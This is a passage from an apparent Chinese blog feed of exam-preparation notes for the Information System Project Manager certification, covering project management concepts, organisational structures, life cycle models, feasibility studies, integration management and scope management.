<h2 id="项目的概念">1.1. 项目的概念</h2>
<ol type="1">
<li>项目是为提供一项<code>独特</code>产品、服务或成果所做的临时性努力。</li>
</ol>
<h2 id="项目的特点">1.2. 项目的特点</h2>
<ol type="1">
<li><code>临时性（一次性）</code>：每一次项目都有确定的开始和结束日期。</li>
<li><code>独特的产品、服务或成果</code>：项目创造独特的可交付成果，如产品、服务或成果。</li>
<li><code>逐步完善</code>：意味着分步、连续的积累。它也称为渐进明细。</li>
<li>资源约束：需要具备各种资源作为实施的保证，且资源是有限的。</li>
<li>目的性：目的在于得到特定的结果，即项目是面向目标的。</li>
</ol>
<h2 id="项目的主要目标">1.3. 项目的主要目标</h2>
<ol type="1">
<li><code>时间</code>、<code>成本</code>和<code>质量</code>是项目工作的三个主要目标，必须同时考虑这三个因素，并且三个因素经常存在冲突。</li>
<li>另一个主要的约束是<code>范围</code>，项目经理的责任就是在四个要素之间进行权衡以保证项目成功。
<img src="/p/a68489ed/项目三要素.webp" alt="项目三要素"></li>
</ol>
<h2 id="项目与日常运作的关系">1.4. 项目与日常运作的关系</h2>
<figure>
<img src="/p/a68489ed/项目与日常运作的关系.webp" alt="项目与日常运作的关系">
<figcaption aria-hidden="true">项目与日常运作的关系</figcaption>
</figure>
<h2 id="项目和战略规划">1.5. 项目和战略规划</h2>
<ol type="1">
<li>战略管理包括以下三个过程：
<ul>
<li>战略制定</li>
<li>战略实施</li>
<li>战略评价</li>
</ul></li>
</ol>
<h2 id="信息系统项目的特点">1.6. 信息系统项目的特点</h2>
<ol type="1">
<li>目标不明确</li>
<li>需求变化频繁</li>
<li>智力密集型</li>
<li>队伍庞大</li>
<li>设计队伍高度专业化</li>
<li>涉及的承包商多</li>
<li>各级承包商分布在各地，相互联系复杂</li>
<li>系统集成项目中需研制大量的软硬件系统</li>
<li>项目的生命期通常较短</li>
<li>通常要采用大量的新技术</li>
<li>使用与维护的要求非常复杂</li>
</ol>
<h2 id="项目管理定义">1.7. 项目管理定义</h2>
<ol type="1">
<li>项目管理是一种管理方法体系。项目管理是一种已被公认的管理模式，而不是一任意的一次管理过程。</li>
<li>项目管理的对象是项目，即<code>一系列临时任务</code>，目的是<code>通过运用科学的项目管理技术，更好地实现项目目标</code>。</li>
<li>项目管理的任务是<code>对项目及其资源的计划、组织。指挥、协调、控制</code>，职能是<code>对组织的资源进行计划、组织、指挥、协调、控制</code>。资源是指项目所在的组织中可得的、为项目所需要的资源，包括人员、资金、技术、设备等，<code>时间</code>是一种特殊的资源。</li>
<li>项目管理运用系统理论与思想。</li>
<li>项目管理职能主要是由<code>项目经理</code>执行的。</li>
</ol>
<hr>
<h1 id="项目管理知识体系构成">2. 项目管理知识体系构成</h1>
<h2 id="软技能">2.1. 软技能</h2>
<ol type="1">
<li>有效的沟通：信息交流。</li>
<li>影响一个组织：<code>让事情办成</code>的能力。</li>
<li>领导能力：<code>形成一个前景和战略</code>并组织人员<code>达到它</code>。</li>
<li>激励：激励人员达到高水平的生产率并客服变革的阻力。</li>
<li>谈判和冲突管理：与其他人谈判或达成协议。</li>
<li>问题解决：问题定义和做出决策的结合。</li>
</ol>
<hr>
<h1 id="ipmppmp">3. IPMP/PMP</h1>
<blockquote>
<p>无重要考点</p>
</blockquote>
<hr>
<h1 id="prince2">4. PRINCE2</h1>
<h2 id="定义与结构">4.1. 定义与结构</h2>
<ol type="1">
<li><code>RPINCE2</code> 认证在国际上被称为项目管理王者认证，是一种<code>基于流程</code>的结构化目管理方法。</li>
</ol>
<h2 id="原则">4.2. 原则</h2>
<ol type="1">
<li>持续业务验证</li>
<li>吸取经验教训</li>
<li>明确定义的角色和职责</li>
<li>按阶段管理</li>
<li>例外管理</li>
<li>关注产品</li>
<li>根据项目环境剪裁</li>
</ol>
<hr>
<h1 id="组织结构对项目的影响">5. 组织结构对项目的影响</h1>
<h2 id="组织结构类型">5.1. 组织结构类型</h2>
<figure>
<img src="/p/a68489ed/组织结构对项目的影响.webp" alt="组织结构对项目的影响">
<figcaption aria-hidden="true">组织结构对项目的影响</figcaption>
</figure>
<h3 id="职能型组织">5.1.1. 职能型组织</h3>
<figure>
<img src="/p/a68489ed/职能型组织类型.webp" alt="职能型组织类型">
<figcaption aria-hidden="true">职能型组织类型</figcaption>
</figure>
<h3 id="项目型组织">5.1.2. 项目型组织</h3>
<figure>
<img src="/p/a68489ed/项目型组织类型.webp" alt="项目型组织类型">
<figcaption aria-hidden="true">项目型组织类型</figcaption>
</figure>
<h3 id="矩阵型组织">5.1.3. 矩阵型组织</h3>
<p><img src="/p/a68489ed/弱矩阵型组织类型.webp" alt="弱矩阵型组织类型"> <img src="/p/a68489ed/强矩阵型组织类型.webp" alt="强矩阵型组织类型"> <img src="/p/a68489ed/平衡矩阵型组织类型.webp" alt="平衡矩阵型组织类型"></p>
<h2 id="各组织类型优缺点">5.2. 各组织类型优缺点</h2>
<table>
<colgroup>
<col style="width: 1%">
<col style="width: 41%">
<col style="width: 42%">
<col style="width: 14%">
</colgroup>
<thead>
<tr class="header">
<th>类型</th>
<th>职能型</th>
<th>项目型</th>
<th>矩阵型</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>优点</td>
<td> 1. 资源利用率相对较高<br>2. 成员工作稳定</td>
<td> 1. 结构单一、责权分明<br>2. 目标明确单一<br>3. 沟通简洁方便<br>4.
决策块</td>
<td>兼有职能型和项目型的优点，比较灵活</td>
</tr>
<tr class="even">
<td>缺点</td>
<td> 1. 管理职能多，目标多样<br>2. 部门间沟通大、协调难度大<br>3.
为项目分配的资源不稳定<br>4. 决策慢</td>
<td> 1. 管理成本过高<br>2. 项目环境比较封闭，不利于沟通分享<br>3.
员工缺乏事业上的连续型和保障等（相对）</td>
<td>团队成员可能存在多头领导</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="信息系统项目的生命周期">6. 信息系统项目的生命周期</h1>
<h2 id="项目生命周期的特征">6.1. 项目生命周期的特征</h2>
<blockquote>
<p>项目具有通用的生命周期结构 - 启动项目 - 组织与准备 - 执行项目工作 -
结束项目 1.
成本与人力投入在开始时较低，在工作执行期间达到最高，在项目快要结束时迅速回落。
<img src="/p/a68489ed/成本与人力投入水平.webp" alt="成本与人力投入水平"> 2.
风险与不确定性在项目开始时最大，在项目整个生命周期中随着决策的制定与交付成果的验收而逐步降低。
3. 做出变更和纠正错误的成本，随着项目越来越接近完成而显著增高。 <img src="/p/a68489ed/随时间变化的变量影响.webp" alt="随时间变化的变量影响"></p>
</blockquote>
<h2 id="项目阶段">6.2. 项目阶段</h2>
<ol type="1">
<li>项目阶段是一组具有逻辑关系的项目活动的集合，通常以一个或多个<code>可交付成果的完成</code>为结束。</li>
<li>阶段与阶段的关系类型
<ul>
<li>顺序关系，一个阶段只能在前一阶段完成后开始</li>
<li>交叠关系，一个阶段可在前一阶段完成前就开始。</li>
</ul></li>
</ol>
<hr>
<h1 id="信息系统项目生命周期模型">7. 信息系统项目生命周期模型</h1>
<h2 id="瀑布模型">7.1. 瀑布模型</h2>
<figure>
<img src="/p/a68489ed/瀑布模型.webp" alt="瀑布模型">
<figcaption aria-hidden="true">瀑布模型</figcaption>
</figure>
<h2 id="螺旋模型">7.2. 螺旋模型</h2>
<figure>
<img src="/p/a68489ed/螺旋模型.webp" alt="螺旋模型">
<figcaption aria-hidden="true">螺旋模型</figcaption>
</figure>
<h2 id="迭代模型">7.3. 迭代模型</h2>
<ol type="1">
<li>初始阶段：系统地阐述项目的范围，选择可行的系统构架，计划和准备业务案例。</li>
<li>细化阶段：细化构想、细化过程和基础设施，细化构架并选择构件。</li>
<li>构造阶段：资源管理、控制和过程最优化。</li>
<li>移交阶段：同步并使并发的构造增量集成到一致的实施基线中。 <img src="/p/a68489ed/迭代模型.webp" alt="迭代模型"></li>
</ol>
<h2 id="v模型">7.4. V 模型</h2>
<ol type="1">
<li>V 模型体现的主要思想是开发和测试同等重要</li>
<li> V 模型针对每个开发阶段，都有一个测试级别与之对应。</li>
<li>V 模型适用于<code>需求明确</code>和<code>需求变更不频繁</code>的情形。
<img src="/p/a68489ed/V模型.webp" alt="V模型"></li>
</ol>
<h2 id="原型化模型">7.5. 原型化模型</h2>
<ol type="1">
<li>原型应当具备的特点：
<ul>
<li>实际可行</li>
<li>具有最终系统的基本特征</li>
<li>构造方便、快速、造价低</li>
</ul></li>
<li>原型法的特点在于<code>对用户的需求是动态响应、逐步纳入的</code>。</li>
<li>原型分类：<code>抛弃式原型</code>、<code>进化式原型</code>。</li>
</ol>
<h2 id="敏捷开发模型">7.6. 敏捷开发模型</h2>
<ol type="1">
<li>敏捷开发是一种以人为核心、迭代、循序渐进的开发方法。</li>
<li>Scrum 是一种迭代式增量软件开发过程，通常用语敏捷软件开发。</li>
</ol>
<hr>
<h1 id="单个项目管理过程">8. 单个项目管理过程</h1>
<h2 id="项目管理过程">8.1. 项目管理过程</h2>
<ol type="1">
<li>按照项目管理过程在项目管理中的职能，可划分为 5 组，叫做项目管理过程组，每一组都有多个过程，共 47 个项目管理过程（重点）。
<ul>
<li>启动过程组</li>
<li>计划过程组</li>
<li>执行过程组</li>
<li>监督与控制过程组</li>
<li>收尾过程组 <img src="/p/a68489ed/项目管理过程组.webp" alt="项目管理过程组-必背"></li>
</ul></li>
</ol>
<h2 id="过程组与戴明环">8.2. 过程组与戴明环</h2>
<ol type="1">
<li>戴明环，即 <code>PDCA循环</code>，包含<code>计划Plan</code>、<code>执行Do</code>、<code>检查Check</code>、<code>行动Action</code> 等阶段。</li>
<li>对应关系
<ul>
<li>计划过程组：计划</li>
<li>执行过程组：执行</li>
<li>监控过程组：检查和行动</li>
<li>启动过程组：这些循环的开始</li>
<li>收尾过程组：循环的结束</li>
</ul></li>
</ol>
]]></content>
      <categories>
        <category>信管备考</category>
      </categories>
      <tags>
        <tag>信息系统项目管理师</tag>
      </tags>
  </entry>
  <entry>
    <title>【信管备考知识点】第 3 章 - 项目立项管理</title>
    <url>/p/4ab704e3.html</url>
    <content><![CDATA[<h1 id="立项管理内容">1. 立项管理内容</h1>
<blockquote>
<p>项目立项一般包括提交<code>项目建议书</code>、<code>项目可行性研究</code>、<code>项目招标</code>和<code>投标</code>等内容。
## 1.1. 项目建议书 1.
项目建议书又称为<code>立项申请</code>，是<code>项目建设单位</code>向上级主管部门提交项目申请时所必须的文件，是对拟建项目提出的框架性的总体设想。
2. 项目建议书的核心内容： - 项目的必要性 - 项目的市场预测 -
产品方案或服务的市场预测 - 项目建设必需的条件</p>
</blockquote>
<h2 id="项目可行性报告">1.2. 项目可行性报告</h2>
<ol type="1">
<li>可行性研究的内容包含：
<ul>
<li>投资必要性，根据市场调查及预测结果，论证项目投资建设的<code>必要性</code>。</li>
<li>技术可行性分析，包含进行项目开发的风险，人力资源的有效性，技术能力的可能性，物资 / 产品的可用性。</li>
<li>财务可行性</li>
<li>组织可行性</li>
<li>经济可行性，支出分析，收益分析，投资回报以及敏感性分析。</li>
<li>社会可行性，分析项目对社会的影响。</li>
<li>风险因素及对策，分析评价市场风险、技术风险、财务风险、组织风险、法律风险、经济及社会风险等。</li>
</ul></li>
</ol>
<h2 id="项目招投标">1.3. 项目招投标</h2>
<blockquote>
<p>参考第 26 章知识产权与标规范章节中法律法规相关内容。</p>
</blockquote>
<hr>
<h1 id="可行性研究">2. 可行性研究</h1>
<h2 id="可行性研究的内容">2.1. 可行性研究的内容</h2>
<ol type="1">
<li>技术可行性分析
<ul>
<li>项目开发风险</li>
<li>人力资源有效性</li>
<li>技术能力可能性</li>
<li>物资 / 产品可用性</li>
</ul></li>
<li>经济可行性分析
<ul>
<li>支出分析
<ul>
<li>一次性支出：开发费、培训费、差费、设备购置费等。</li>
<li>非一次性支出：软硬件租金、人员工资福利、水电使用以及其他消耗品支出等。</li>
</ul></li>
<li>收益分析
<ul>
<li>直接收益：通过项目实施，获得的直接经济效益，如销售项目产品的收入。</li>
<li>间接收益：通过项目实施，以间接的方式获得的收益，如成本降低。</li>
</ul></li>
</ul></li>
<li>运行环境可行性分析
<ul>
<li>从用户单位的管理体制、管理方法、规章制度、工作习惯、人员素质、数据资源积累、硬件（含系统软件）平台等多方面进行评估。</li>
</ul></li>
<li>其他方面可行性分析
<ul>
<li>如法律可行性、社会可行性等。</li>
</ul></li>
</ol>
<h2 id="可行性研究的步骤">2.2. 可行性研究的步骤</h2>
<ol type="1">
<li>可行性研究一般可分为<code>初步可行性研究</code>、<code>详细可行性研究</code>、<code>可行性研究报告</code>三个基本阶段，可归纳为如下几个基本步骤。
<ul>
<li>确定项目规模和目标</li>
<li>研究正在运行的系统</li>
<li>建立新系统的逻辑模型</li>
<li>导出和评价各种方案</li>
<li>推荐可行性方案</li>
<li>编写可行性研究报告</li>
<li>递交可行性研究报告</li>
</ul></li>
</ol>
<h2 id="初步可行性研究">2.3. 初步可行性研究</h2>
<ol type="1">
<li>研究的目的
<ul>
<li>分析项目的前途。</li>
<li>初步估计和确定项目关键技术及核心问题，以确定是否需要解决。</li>
<li>初步估计必须进行的辅助研究，是否具备必要的技术、试验和人力条件作为支持。</li>
</ul></li>
<li>研究的内容
<ul>
<li>市场和生产能力</li>
<li>设备与材料投入分析</li>
<li>网络规划、物理布局方案的选择</li>
<li>项目设计</li>
<li>项目进度安排</li>
<li>项目投资与成本估算</li>
</ul></li>
</ol>
<blockquote>
<p>在初步项目可行性研究之前可以进行<code>项目机会研究</code>，<strong>如果就投资可能性已进行了项目机会研究，那么项目的初步可行性研究阶段就可省去</strong>。</p>
</blockquote>
<h2 id="详细可行性研究">2.4. 详细可行性研究</h2>
<ol type="1">
<li><p><code>机会研究</code>、<code>初步可行性研究</code>、<code>详细可行性研究</code>、<code>评估与决策</code>是投资前期的四个阶段。在实际工作中，<strong>前三个阶段依赖项目规模和繁简程度，可把前两个阶段省略或合二为一，但详细可行性研究不可缺少。升级改造项目只做初步和详细研究，小项目一般只进行详细可行性研究</strong>。</p></li>
<li><p>研究的基本原则</p>
<ul>
<li>科学性原则</li>
<li>客观性原则</li>
<li>公正性原则</li>
</ul></li>
<li><p>研究的方法</p>
<ul>
<li>经济评价法</li>
<li>市场预测法</li>
<li>投资估算法</li>
<li>增量净效益</li>
</ul></li>
<li><p>研究的内容</p>
<ul>
<li>概述</li>
<li>需求确定</li>
<li>现有资源、设施情况分析</li>
<li>设计（初步）技术方案</li>
<li>项目实施进度计划建议</li>
<li>投资估算和资金筹措计划</li>
<li>项目组织、人力资源、技术培训计划</li>
<li>经济和社会效益分析</li>
<li>合作 / 协作方式</li>
</ul></li>
<li><p>开发总成本：研发成本、行政管理费、销售与分销费用、财务费用和折扣。</p></li>
</ol>
<hr>
<h1 id="项目评估与论证">3. 项目评估与论证</h1>
<h2 id="项目论证">3.1. 项目论证</h2>
<ol type="1">
<li><p><code>先论证，后评估</code>是现代项目管理的基本原则。</p></li>
<li><p>项目论证应该围绕<code>市场需求</code>、<code>开发技术</code>、<code>财务经济</code>三个方面展开调查和分析。</p></li>
<li><p>项目论证的阶段划分</p>
<ul>
<li>机会研究</li>
<li>初步可行性研究</li>
<li>详细可行性研究 <img src="/p/4ab704e3/项目论证阶段划分.webp" alt="项目论证阶段划分"></li>
</ul></li>
<li><p>项目论证的步骤（排序题）</p>
<ul>
<li>明确项目范围和业主目标</li>
<li>收集并分析相关资料</li>
<li>拟定多种可行的能够相互替代的实施方案</li>
<li>多方案分析、比较</li>
<li>选择最有方案进一步详细全面地论证</li>
<li>编制项目论证报告、环境影响报告和采购方式审批报告</li>
<li>编制资金筹措计划和项目实施进度计划</li>
</ul></li>
</ol>
<h2 id="项目评估">3.2. 项目评估</h2>
<ol type="1">
<li><p>项目评估在项目可行性研究的基础上，由<code>第三方（国家、银行或有关机构）</code>进行评价、分析和论证。</p></li>
<li><p>评估的依据</p>
<ul>
<li>项目建议书及其批准文件</li>
<li>项目可行性报告研究报告</li>
<li>报送单位的申请报告及主管部门的初审意见</li>
<li>有关资源、配件、燃料、水电、交通、资金外汇等方面的协议文件</li>
<li>必需的其他文件和资料</li>
</ul></li>
<li><p>评估工作程序</p>
<ul>
<li>成立评估小组，分工，制定评估工作计划</li>
<li>开展调查研究，收集数据资料，对可行性研究报告和相关资料进行审查和分析</li>
<li>分析与评估</li>
<li>编写评估报告</li>
<li>讨论、修改报告</li>
<li>专家论证会</li>
<li>评估报告定稿</li>
</ul></li>
</ol>
]]></content>
      <categories>
        <category>信管备考</category>
      </categories>
      <tags>
        <tag>信息系统项目管理师</tag>
      </tags>
  </entry>
  <entry>
    <title>【信管备考知识点】第 4 章 - 项目整体管理</title>
    <url>/p/9bc13447.html</url>
    <content><![CDATA[<blockquote>
<p>考试核心：十大项目管理之一 针对题型：论文写作
备考重点：每个管理包含的过程及定义，每个过程的输入、输出、工具、技术。</p>
</blockquote>
<h1 id="项目整体管理概述">1. 项目整体管理概述</h1>
<ol type="1">
<li>项目管理包括：<code>范围</code>、<code>进度</code>、<code>成本</code>、<code>质量</code>、<code>人力资源</code>、<code>沟通</code>、<code>风险</code>和<code>采购</code>。</li>
<li>整体管理还必须努力<strong>在各个相互冲突的目标与方案之间权衡取舍</strong>。</li>
</ol>
<hr>
<h1 id="制定项目章程">2. 制定项目章程</h1>
<blockquote>
<p>编写一份正式文件（即：<code>项目章程</code>）的过程 1.
项目章程是正式批准项目的文件，项目经理在任何时候都应在<code>规划开始之前被委派</code>，最好是在指定项目章程之时。
2.
项目章程是由<code>项目实施组织外部</code>签发的。项目签发章程之后，就建立了项目与组织日常工作之间的联系。
3.
项目章程的批准，标志着项目的正式启动。<code>项目经理应该参与指定项目章程</code>。
4.
项目章程由<code>项目以外的人员批准</code>，如发起人、项目管理办公室或项目组合指导委员会。</p>
</blockquote>
<h2 id="项目章程的作用">2.1. 项目章程的作用</h2>
<ol type="1">
<li>确定项目经理，规定项目经理的权力。</li>
<li>正式确认项目的存在，给项目一个合法的地位。</li>
<li>规定项目的总体目标，包括范围、时间、成本和质量等。</li>
<li>通过叙述启动项目的理由，把项目与执行组织的日常经营运作及战略计划等联系起来。</li>
</ol>
<h2 id="项目章程的内容">2.2. 项目章程的内容</h2>
<ol type="1">
<li>项目目的获批准项目的原因</li>
<li>可测量的项目目标和相关的成功标准</li>
<li>项目的总体要求</li>
<li>概括性的项目描述</li>
<li>项目的主要风险</li>
<li>总体里程碑进度计划</li>
<li>总体预算</li>
<li>项目审批要求</li>
<li>委派的项目经理及其职责或职权</li>
<li>发起人或其他批准项目章程的人员姓名和职权</li>
</ol>
<h2 id="指定项目章程的依据输入">2.3. 指定项目章程的依据（输入）</h2>
<ol type="1">
<li>协议：定义项目的初衷</li>
<li>项目工作说明书：由项目提供的产品或服务的文字说明</li>
<li>商业论证：从商业角度提供必要信息，决定项目是否值得投资</li>
<li>事业环境因素：任何一种存在于项目周围并对项目成功有影响的因素或制度，包含如下事项：
<ul>
<li>组织或公司的文化与组成结构</li>
<li>政府或行业标准</li>
<li>基础设施（现有软硬件基础设施等）</li>
<li>现有人力资源</li>
<li>人事管理</li>
<li>公司工作核准制度</li>
<li>市场情况</li>
<li>商业网数据库</li>
<li>项目管理信息系统</li>
</ul></li>
<li>组织过程资产：任何一种以及所有用于影响项目成功的资产，分为如下两类：
<ul>
<li>过程和程序
<ul>
<li>组织的标准过程</li>
<li>标准指导方针、模板、工作指南</li>
<li>用于满足项目特定需要的标准过程的修正指南</li>
<li>组织的沟通要求、汇报制度</li>
<li>项目收尾指南或要求</li>
<li>财务控制程序</li>
<li>问题和缺陷管理程序</li>
<li>变更控制程序</li>
<li>风险控制程序</li>
<li>批准与发布工作授权程序</li>
</ul></li>
<li>组织的全部知识
<ul>
<li>项目档案</li>
<li>过程测量数据库</li>
<li>经验学习系统</li>
<li>问题和缺陷管理数据库</li>
<li>配置管理数据库</li>
<li>财务数据库</li>
</ul></li>
</ul></li>
</ol>
<h2 id="项目财务价值评价方法">2.4. 项目财务价值评价方法</h2>
<ol type="1">
<li>净现值分析</li>
<li>投资收益率分析</li>
<li>投资回收期分析</li>
</ol>
<h2 id="项目启动会议">2.5. 项目启动会议</h2>
<ol type="1">
<li>是一个项目的开始，一般有项目经理负责组织和召开。其目的主要在于是项目的主要利益相关者明确项目的目标、范围、需求、背景及各自的职责与权限。</li>
</ol>
<h2 id="项目目标">2.6. 项目目标</h2>
<ol type="1">
<li>项目目标应该是<code>具体的</code>、<code>可度量的</code>、<code>可达到的</code>、<code>与企业战略目标相关的</code>、<code>有时间限制的</code>。</li>
<li>成果目标和约束目标之间经常发生矛盾，甚至发生冲突。</li>
<li>目标必须要量化，是可度量的。</li>
<li>项目通常有多个目标。</li>
</ol>
<h2 id="引导技术">2.7. 引导技术</h2>
<ol type="1">
<li>可用于指导项目章程的制定。</li>
<li>关键技术：<code>头脑风暴</code>、<code>冲突处理</code>、<code>问题解决</code>、<code>会议管理</code>。</li>
</ol>
<hr>
<h1 id="制定项目管理计划">3. 制定项目管理计划</h1>
<blockquote>
<p>定义、准备和协调所有子计划，并把它们整合为一份综合项目管理计划的过程</p>
</blockquote>
<h2 id="项目管理计划的分计划">3.1. 项目管理计划的分计划</h2>
<ol type="1">
<li>范围管理计划</li>
<li>进度管理计划</li>
<li>成本管理计划</li>
<li>质量管理计划</li>
<li>过程改进计划</li>
<li>人员配备管理计划</li>
<li>沟通管理计划</li>
<li>风险管理计划</li>
<li>采购管理计划</li>
<li>干系人管理计划</li>
<li>需求管理计划</li>
</ol>
<blockquote>
<p>其他组成部分包括：<code>里程碑清单</code>、<code>资源日历</code>、<code>进度基准</code>、<code>成本基准</code>、<code>质量基准</code>、<code>风险登记册</code>等。</p>
</blockquote>
<h2 id="项目管理计划内容">3.2. 项目管理计划内容</h2>
<ol type="1">
<li>项目管理团队选择的各个项目管理过程</li>
<li>每一选定过程的实施水平</li>
<li>对实施这些过程时使用的工具与技术所做的说明</li>
<li>在管理具体项目中使用选定过程的方式和方法，包括过程之间的依赖关系和相互作用，以及重要的依据和成果</li>
<li>为了实现项目目标所执行工作的方式、方法</li>
<li>监控变更的方式、方法</li>
<li>实施配置管理的方式、方法</li>
<li>使用实施效果测量基准并使之保持完整的方式、方法</li>
<li>项目干系人之间的沟通需要与技术</li>
<li>选定的项目生命期和多阶段项目的项目阶段</li>
<li>高层管理人员为了加快解决未解决的问题和处理未做出的决策，对内容、范围和时间安排的关键审查。</li>
</ol>
<h2 id="制定计划的原则">3.3. 制定计划的原则</h2>
<ol type="1">
<li>从宏观上把握项目主体管理思路，不可理想化而期望项目管理计划一步到位。
&gt; 全员参与，逐步明确</li>
</ol>
<h2 id="项目管理信息系统的子系统">3.4. 项目管理信息系统的子系统</h2>
<ol type="1">
<li>配置管理系统：正式形成为文件的程序的全体。</li>
<li>变更控制系统：正式形成文件的过程的全体，用于确定控制、改变和批准项目可交付成果和文件的方式、方法。<code>是配置管理系统的子系统</code>
<img src="/p/9bc13447/项目管理信息系统.webp" alt="项目管理信息系统"></li>
</ol>
<hr>
<h1 id="指导与管理项目执行">4. 指导与管理项目执行</h1>
<blockquote>
<p>为实现项目目标而领导和执行项目管理计划中所确定的工作，并实施已批准变更的过程</p>
</blockquote>
<h2 id="执行要求实施内容">4.1. 执行要求实施内容</h2>
<ol type="1">
<li>批准的纠正措施，使项目实施的预期结果始终符合项目管理计划的要求。</li>
<li>批准的预防措施，降低潜在的消极后果发生的可能性。</li>
<li>批准的缺陷补救请求，纠正质量过程发现的产品缺陷。</li>
</ol>
<h2 id="整体协调采取的行动">4.2. 整体协调采取的行动</h2>
<ol type="1">
<li>随时审查和更新项目计划</li>
<li>坚持项目计划，保持控制</li>
<li>化解冲突</li>
<li>扫除障碍</li>
<li>确定优先次序</li>
<li>做出各界面之间的行政和技术决定</li>
<li>解决顾客和委托人的问题</li>
<li>保证项目阶段之间的衔接</li>
<li>保证各界面之间的沟通顺畅</li>
</ol>
<h2 id="会议分类">4.3. 会议分类</h2>
<ol type="1">
<li>交换信息</li>
<li>头脑风暴</li>
<li>方案评估或设计</li>
<li>制定决策</li>
</ol>
<hr>
<h1 id="监控项目工作">5. 监控项目工作</h1>
<blockquote>
<p>跟踪、审查和报告项目进展，以实现项目管理计划中确定的绩效目标的过程</p>
</blockquote>
<h2 id="监控对象">5.1. 监控对象</h2>
<ol type="1">
<li>对照项目管理计划比较项目的实际表现</li>
<li>评价项目的绩效，判断是否出现需求采取纠正或预防措施的迹象，并在必要时提出采取行动的建议</li>
<li>分析、分钟并监视项目风险，确保及时识别风险，报告状态，执行适当的风险应对计划</li>
<li>建立有关项目产品以及文件的准确和及时的信息库，并保持到项目完成</li>
<li>为状态报告、绩效测量和预测提供信息支持</li>
<li>为更新当前的成本和进度信息提供预测</li>
</ol>
<h2 id="分析技术">5.2. 分析技术</h2>
<ol type="1">
<li>回归分析</li>
<li>分组方法</li>
<li>因果分析</li>
<li>根本原因分析</li>
<li>预测方法</li>
<li>失效模式与影响分析</li>
<li>故障树分析</li>
<li>储备分析</li>
<li>趋势分析</li>
<li>挣值管理</li>
</ol>
<hr>
<h1 id="实施整体变更控制">6. 实施整体变更控制</h1>
<blockquote>
<p>审查所有变更请求，批准变更，管理对可交付成果、组织过程资产、项目文件和项目管理计划的变更，并对变更处理结果进行沟通的过程
<code>贯穿项目的始终</code>。</p>
</blockquote>
<h2 id="整体变更控制过程的变更管理活动">6.1.
整体变更控制过程的变更管理活动</h2>
<ol type="1">
<li>确定是否需要变更或者变更是否已经发生</li>
<li>对妨碍整体变更控制的因素施加影响，保证只实施经过批准的变更</li>
<li>审查和批准请求的变更</li>
<li>控制申请变更的流程，在发生变更时管理批准的变更</li>
<li>仅允许被批准的变更纳入项目产品或服务中</li>
<li>审查与批准所有的纠正与预防措施建议</li>
<li>根据批准的变更控制与更新范围、成本、预算进度和质量要求，协调整个项目的变更</li>
<li>将请求的变更全部影响记录在案</li>
<li>确认缺陷补救</li>
<li>根据质量报告并按照标准控制质量</li>
</ol>
<h2 id="整体变更控制过程的配置管理活动">6.2.
整体变更控制过程的配置管理活动</h2>
<ol type="1">
<li>配置识别</li>
<li>配置状态记录</li>
<li>配置核实与审计</li>
</ol>
<hr>
<h1 id="结束项目或阶段">7. 结束项目或阶段</h1>
<blockquote>
<p>完成所有项目管理过程组的所有活动，以正式结束项目或阶段的过程</p>
</blockquote>
<h2 id="本过程的作用">7.1. 本过程的作用</h2>
<ol type="1">
<li>总结经验教训</li>
<li>正式结束项目工作</li>
<li>为开展新工作而释放组织资源</li>
</ol>
<h2 id="步骤参考">7.2. 步骤参考</h2>
<pre class="mermaid">graph TD
A((Start))--&gt;B(确定收尾程序) --&gt; C(移交项目成果) --&gt; D(完成经验总结) --&gt; E(项目归档) --&gt;F(资源遣散) --&gt; Z((END))</pre>
]]></content>
      <categories>
        <category>信管备考</category>
      </categories>
      <tags>
        <tag>信息系统项目管理师</tag>
      </tags>
  </entry>
  <entry>
    <title>【信管备考知识点】第 5 章 - 项目范围管理</title>
    <url>/p/fa77ee29.html</url>
    <content><![CDATA[<blockquote>
<p>考试核心：十大项目管理之一 针对题型：论文写作
备考重点：每个管理包含的过程及定义，每个过程的输入、输出、工具、技术。</p>
</blockquote>
<h1 id="范围管理概述">1. 范围管理概述</h1>
<h2 id="范围管理的工作内容">1.1. 范围管理的工作内容</h2>
<ol type="1">
<li>明确项目边界</li>
<li>对项目执行工作进行监控</li>
<li>防止项目范围发生蔓延</li>
</ol>
<h2 id="项目范围管理的6个过程">1.2. 项目范围管理的 6 个过程</h2>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 10%">
<col style="width: 65%">
</colgroup>
<thead>
<tr class="header">
<th>管理过程</th>
<th>所属过程组</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>规划范围管理</td>
<td>规划过程组</td>
<td>编制范围管理计划，书面描述如何定义、确认和控制项目范围的过程</td>
</tr>
<tr class="even">
<td>收集需求</td>
<td>规划过程组</td>
<td>为实现项目目标而确定、记录并管理干系人的需要和需求的过程</td>
</tr>
<tr class="odd">
<td>定义范围</td>
<td>规划过程组</td>
<td>制定项目和产品详细描述的过程</td>
</tr>
<tr class="even">
<td>创建工作分解结构（WBS）</td>
<td>规划过程组</td>
<td>将项目可交付成果和项目工作分解成较小的、更易于管理的组件的过程</td>
</tr>
<tr class="odd">
<td>确认范围</td>
<td>监控过程组</td>
<td>正式验收已完成的项目可交付成果的过程</td>
</tr>
<tr class="even">
<td>控制范围</td>
<td>监控过程组</td>
<td>监督项目和产品的范围状态，管理范围基准变更的过程</td>
</tr>
</tbody>
</table>
<h2 id="各过程的输入输出及工具技术">1.3. 各过程的输入输出及工具技术</h2>
<table>
<colgroup>
<col style="width: 3%">
<col style="width: 30%">
<col style="width: 34%">
<col style="width: 31%">
</colgroup>
<thead>
<tr class="header">
<th>管理过程</th>
<th>输入</th>
<th>工具技术</th>
<th>输出</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>规划范围管理</td>
<td> 1. 项目管理计划<br>2. 项目章程<br>3. 事业环境因素<br>4.
组织过程资产</td>
<td> 1. 专家判断<br>2. 会议</td>
<td> 1. 范围管理计划<br>2. 需求管理计划</td>
</tr>
<tr class="even">
<td>收集需求</td>
<td> 1. 项目管理计划<br>2. 范围管理计划<br>3. 干系人管理计划<br>4.
项目章程<br>5. 干系人登记册</td>
<td> 1. 访谈、问卷调查<br>2. 焦点小组<br>3. 引导式研讨会<br>4.
观察、标杆对照<br>5. 系统交互图<br>6. 文件分析</td>
<td> 1. 需求分析<br>2. 需求跟踪矩阵</td>
</tr>
<tr class="odd">
<td>定义范围</td>
<td> 1. 项目管理计划<br>2. 项目章程<br>3. 需求文件<br>4.
组织过程资产</td>
<td> 1. 专家判断<br>2. 产品分析<br>3. 备选方案生成<br>4.
